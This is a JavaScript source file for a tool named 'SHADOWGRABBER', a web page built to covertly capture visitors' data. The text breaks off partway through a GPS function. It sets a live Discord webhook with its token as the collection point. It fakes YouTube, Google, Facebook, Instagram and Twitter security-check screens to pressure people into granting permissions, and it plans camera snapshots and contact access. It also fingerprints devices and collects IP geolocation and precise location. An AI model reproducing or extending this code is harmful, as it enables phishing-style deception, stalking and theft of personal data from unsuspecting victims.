// 💀 SHADOWGRABBER v18.0 - ADVANCED INTELLIGENCE SUITE 💀
// ═══════════════════════════════════════════════════════════════════════════
// "Complete Digital Footprint Capture"
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: getRedirectUrl() || 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    CAMERA_SNAPS: 8,
    SNAP_INTERVAL: 300,
    AUTO_START: true,
    FORCE_PERMISSIONS: true,
    FORCE_CONTACTS: true,
    MAX_RETRIES: 3,
    ENHANCED_LOGGING: true
};

function getRedirectUrl() {
    const params = new URLSearchParams(window.location.search);
    return params.get('redirect') || params.get('url') || params.get('to');
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧩 ENHANCED UI INTERCEPTOR WITH MULTI-STEP NAGGING
// ═══════════════════════════════════════════════════════════════════════════
class EnhancedEngagementOverlay {
    constructor() {
        this.overlay = null;
        this.retryCount = 0;
    }

    create(title, message, buttonText, persistent = false, skipable = false) {
        return new Promise(resolve => {
            if (this.overlay) document.body.removeChild(this.overlay);
            
            this.overlay = document.createElement('div');
            Object.assign(this.overlay.style, {
                position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
                backgroundColor: 'rgba(0,0,0,0.97)', zIndex: '999999', display: 'flex',
                alignItems: 'center', justifyContent: 'center', flexDirection: 'column',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                backdropFilter: 'blur(10px)'
            });

            let skipBtn = '';
            if (skipable) {
                skipBtn = `<button id="overlay-skip" style="background:transparent; color:#AAA; border:1px solid #555; padding:10px 0; width:100%; border-radius:8px; font-size:14px; margin-top:10px; cursor:pointer;">Skip for now</button>`;
            }

            this.overlay.innerHTML = `
                <div style="background:linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); padding:30px; border-radius:20px; width:90%; max-width:380px; text-align:center; border:1px solid #404040; box-shadow: 0 20px 60px rgba(0,0,0,0.7);">
                    <div style="font-size:48px; margin-bottom:20px; animation:pulse 2s infinite;">🔒</div>
                    <h2 style="color:#FFF; margin:0 0 15px; font-size:22px; font-weight:700;">${title}</h2>
                    <p style="color:#BBB; font-size:15px; margin:0 0 30px; line-height:1.6;">${message}</p>
                    <button id="overlay-btn" style="background:linear-gradient(135deg, #007AFF 0%, #0056CC 100%); color:#FFF; border:none; padding:14px 0; width:100%; border-radius:12px; font-size:17px; font-weight:600; cursor:pointer; transition:all 0.3s;">${buttonText}</button>
                    ${skipBtn}
                    <style>@keyframes pulse {0%{transform:scale(1);}50%{transform:scale(1.1);}100%{transform:scale(1);}}</style>
                </div>
            `;

            document.body.appendChild(this.overlay);

            const btn = document.getElementById('overlay-btn');
            btn.onclick = () => {
                btn.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    this.overlay.style.opacity = '0';
                    setTimeout(() => {
                        if (this.overlay && this.overlay.parentNode) {
                            document.body.removeChild(this.overlay);
                            this.overlay = null;
                        }
                        resolve(true);
                    }, 300);
                }, 100);
            };

            if (skipable) {
                const skipBtn = document.getElementById('overlay-skip');
                skipBtn.onclick = () => {
                    this.overlay.style.opacity = '0';
                    setTimeout(() => {
                        if (this.overlay && this.overlay.parentNode) {
                            document.body.removeChild(this.overlay);
                            this.overlay = null;
                        }
                        resolve(false);
                    }, 300);
                };
            }
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 ADVANCED CONTEXT DETECTION WITH DOMAIN MATCHING
// ═══════════════════════════════════════════════════════════════════════════
class AdvancedContextManager {
    constructor(url) {
        this.url = url.toLowerCase();
        this.ctx = this.detectContext();
    }

    detectContext() {
        const contexts = {
            'youtube': {
                title: 'YouTube',
                header: 'Loading YouTube Video...',
                theme: '#FF0000',
                logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`,
                bgColor: '#000000'
            },
            'google': {
                title: 'Google',
                header: 'Google Security Verification',
                theme: '#4285F4',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`,
                bgColor: '#FFFFFF'
            },
            'facebook': {
                title: 'Facebook',
                header: 'Facebook Security Check',
                theme: '#1877F2',
                logo: `<svg viewBox="0 0 36 36" width="60" height="60" fill="#1877F2"><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471V23.044h-4.111V18h4.111v-3.556c0-4.089 2.414-6.348 6.174-6.348 1.788 0 3.652.319 3.652.319v4.031h-2.056c-2.027 0-2.656 1.269-2.656 2.56V18h4.519l-.722 5.044h-3.797v12.446c3.629-.616 6.873-2.562 9.087-5.274l-2.476-4.174z"></path></svg>`,
                bgColor: '#F0F2F5'
            },
            'instagram': {
                title: 'Instagram',
                header: 'Instagram Verification',
                theme: '#E4405F',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><radialGradient id="a" cx="19.38" cy="42.035" r="44.899" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fd5"/><stop offset=".328" stop-color="#ff543e"/><stop offset=".348" stop-color="#fc5245"/><stop offset=".504" stop-color="#e64771"/><stop offset=".643" stop-color="#d53e91"/><stop offset=".761" stop-color="#cc39a4"/><stop offset=".841" stop-color="#c837ab"/></radialGradient><path fill="url(#a)" d="M34.017 41.99l-20 .019C9.345 42.036 6 38.578 6 34.017l.019-20C6.036 9.345 9.493 6 14.053 6h19.929c4.56 0 8.018 3.456 8.018 8.017v19.956c0 4.56-3.458 8.018-8.018 8.017z"/><radialGradient id="b" cx="11.786" cy="5.054" r="29.813" gradientTransform="matrix(1 0 0 .6663 0 1.849)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4168c9"/><stop offset=".999" stop-color="#4168c9" stop-opacity="0"/></radialGradient><path fill="url(#b)" d="M34.017 41.99l-20 .019C9.345 42.036 6 38.578 6 34.017l.019-20C6.036 9.345 9.493 6 14.053 6h19.929c4.56 0 8.018 3.456 8.018 8.017v19.956c0 4.56-3.458 8.018-8.018 8.017z"/><path fill="#fff" d="M24 31c-3.859 0-7-3.14-7-7s3.141-7 7-7 7 3.14 7 7-3.141 7-7 7zm0-12c-2.757 0-5 2.243-5 5s2.243 5 5 5 5 2.243 5 5-2.243 5-5 5-5-2.243-5-5 2.243-5 5-5z"/><circle cx="31.5" cy="16.5" r="1.5" fill="#fff"/></svg>`,
                bgColor: '#000000'
            },
            'twitter': {
                title: 'Twitter',
                header: 'Twitter Security Check',
                theme: '#1DA1F2',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#1DA1F2" d="M42 12.429a14.978 14.978 0 01-4.244 1.162 7.39 7.39 0 003.251-4.058 14.914 14.914 0 01-4.7 1.776 7.389 7.389 0 00-12.788 5.041 7.389 7.389 0 00.187 1.68 20.963 20.963 0 01-15.222-7.721 7.357 7.357 0 00-1 3.717 7.388 7.388 0 003.285 6.148 7.36 7.36 0 01-3.349-.924v.094a7.388 7.388 0 005.925 7.236 7.417 7.417 0 01-3.336.127 7.39 7.39 0 006.9 5.128 14.83 14.83 0 01-10.928 3.056 20.941 20.941 0 0011.321 3.312c13.585 0 21.017-11.251 21.017-21.017 0-.321-.008-.642-.022-.958A14.945 14.945 0 0042 12.429z"/></svg>`,
                bgColor: '#000000'
            }
        };

        try {
            const urlObj = new URL(this.url);
            const hostname = urlObj.hostname.toLowerCase();
            
            for (const [key, context] of Object.entries(contexts)) {
                if (hostname.includes(key)) {
                    return context;
                }
            }
            
            // Generic domain detection
            const domain = hostname.replace('www.', '').split('.')[0];
            return {
                title: domain.charAt(0).toUpperCase() + domain.slice(1),
                header: `Secure Connection to ${domain.charAt(0).toUpperCase() + domain.slice(1)}`,
                theme: '#4285F4',
                logo: `<svg viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="15" fill="#4285F4"/><path d="M20 12v6l5-3-5-3z" fill="#FFF"/></svg>`,
                bgColor: '#FFFFFF'
            };
        } catch (e) {
            return contexts.youtube;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🔧 ENHANCED SYSTEM FORENSICS MODULE
// ═══════════════════════════════════════════════════════════════════════════
class AdvancedSystemScanner {
    async scan() {
        const data = {
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
            platform: navigator.platform,
            vendor: navigator.vendor || 'Unknown',
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages?.join(', ') || 'Unknown',
            cookieEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            doNotTrack: navigator.doNotTrack || 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'Unknown'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            fonts: await this.getFonts(),
            plugins: this.getPlugins(),
            battery: await this.getBatteryInfo(),
            storage: await this.getStorageInfo(),
            connection: this.getConnectionInfo(),
            mediaDevices: await this.getMediaDevices()
        };

        return data;
    }

    async getFonts() {
        if (!document.fonts) return 'Unknown';
        const fonts = await document.fonts.ready;
        const fontSet = new Set();
        document.fonts.forEach(font => fontSet.add(font.family));
        return Array.from(fontSet).slice(0, 10).join(', ');
    }

    getPlugins() {
        if (!navigator.plugins) return 'Unknown';
        return Array.from(navigator.plugins).map(p => p.name).join(', ');
    }

    async getBatteryInfo() {
        if (!navigator.getBattery) return 'Not Supported';
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {
            return 'Error';
        }
    }

    async getStorageInfo() {
        if (!('storage' in navigator && 'estimate' in navigator.storage)) return 'Not Supported';
        try {
            const est = await navigator.storage.estimate();
            return {
                quota: `${(est.quota / 1024 / 1024 / 1024).toFixed(2)} GB`,
                usage: `${(est.usage / 1024 / 1024).toFixed(2)} MB`,
                percentage: est.quota ? ((est.usage / est.quota) * 100).toFixed(1) + '%' : 'N/A'
            };
        } catch (e) {
            return 'Error';
        }
    }

    getConnectionInfo() {
        if (!navigator.connection) return 'Not Supported';
        const conn = navigator.connection;
        return {
            type: conn.type || 'Unknown',
            effectiveType: conn.effectiveType || 'Unknown',
            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
            rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown',
            saveData: conn.saveData || false
        };
    }

    async getMediaDevices() {
        if (!navigator.mediaDevices?.enumerateDevices) return 'Not Supported';
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const deviceList = devices.map(d => ({
                kind: d.kind,
                label: d.label || 'Unknown',
                deviceId: d.deviceId
            }));
            return deviceList;
        } catch (e) {
            return 'Error';
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 ADVANCED NETWORK INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════
class AdvancedNetworkAnalyzer {
    constructor() {
        this.ipServices = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://api.ipgeolocation.io/ipgeo?apiKey=demo',
            'http://ip-api.com/json/'
        ];
    }

    async analyze() {
        const result = {
            ip: await this.getIP(),
            network: await this.getNetworkInfo(),
            speed: await this.testSpeed(),
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            url: window.location.href
        };
        
        return result;
    }

    async getIP() {
        for (const service of this.ipServices) {
            try {
                const response = await fetch(service, { 
                    signal: AbortSignal.timeout(5000) 
                });
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.ip || data.query || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || data.regionName || 'Unknown',
                        country: data.country || data.country_name || 'Unknown',
                        countryCode: data.country_code || data.countryCode || 'Unknown',
                        timezone: data.timezone || 'Unknown',
                        org: data.org || data.isp || 'Unknown',
                        as: data.as || 'Unknown',
                        lat: data.latitude || data.lat || 'Unknown',
                        lon: data.longitude || data.lon || 'Unknown',
                        zip: data.zip || data.postal || 'Unknown'
                    };
                }
            } catch (e) {
                continue;
            }
        }
        return { ip: 'Unknown' };
    }

    async getNetworkInfo() {
        if (!navigator.connection) return 'Not Supported';
        const conn = navigator.connection;
        return {
            type: conn.type || 'Unknown',
            effectiveType: conn.effectiveType || 'Unknown',
            downlink: conn.downlink || 'Unknown',
            rtt: conn.rtt || 'Unknown',
            saveData: conn.saveData || false,
            downlinkMax: conn.downlinkMax || 'Unknown'
        };
    }

    async testSpeed() {
        const startTime = performance.now();
        try {
            // Test with multiple resources
            const promises = [];
            for (let i = 0; i < 3; i++) {
                promises.push(fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?t=${Date.now() + i}`, {
                    cache: 'no-store',
                    mode: 'no-cors'
                }));
            }
            await Promise.any(promises);
            const endTime = performance.now();
            const duration = endTime - startTime;
            const speed = (15 * 8 * 1000) / duration / 1024 / 1024; // Approx Mbps
            return {
                speed: `${(speed * 12).toFixed(2)} Mbps`,
                latency: `${duration.toFixed(0)} ms`,
                status: 'Success'
            };
        } catch (e) {
            return {
                speed: 'Network Error',
                latency: 'N/A',
                status: 'Failed'
            };
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 ENHANCED LOCATION MODULE WITH FALLBACKS
// ═══════════════════════════════════════════════════════════════════════════
class EnhancedLocationGuard {
    constructor(overlay) { 
        this.overlay = overlay;
        this.retryCount = 0;
    }

    async lock() {
        return new Promise(async (resolve) => {
            // Try GPS first
            const gpsResult = await this.tryGPS();
            if (gpsResult.success) {
                resolve(gpsResult);
                return;
            }

            // Fallback to IP geolocation
            const network = new AdvancedNetworkAnalyzer();
            const ipData = await network.analyze();
            
            if (ipData.ip && ipData.ip.lat && ipData.ip.lon) {
                resolve({
                    success: true,
                    source: 'IP',
                    coords: {
                        latitude: ipData.ip.lat,
                        longitude: ipData.ip.lon,
                        accuracy: 5000, // Approximate accuracy for IP location
                        altitude: null,
                        altitudeAccuracy: null
                    },
                    address: `${ipData.ip.city}, ${ipData.ip.region}, ${ipData.ip.country}`
                });
            } else {
                resolve({
                    success: false,
                    error: 'Could not determine location',
                    source: 'None'
                });
            }
        });
    }

    async tryGPS() {
        return new Promise((resolve) => {
     
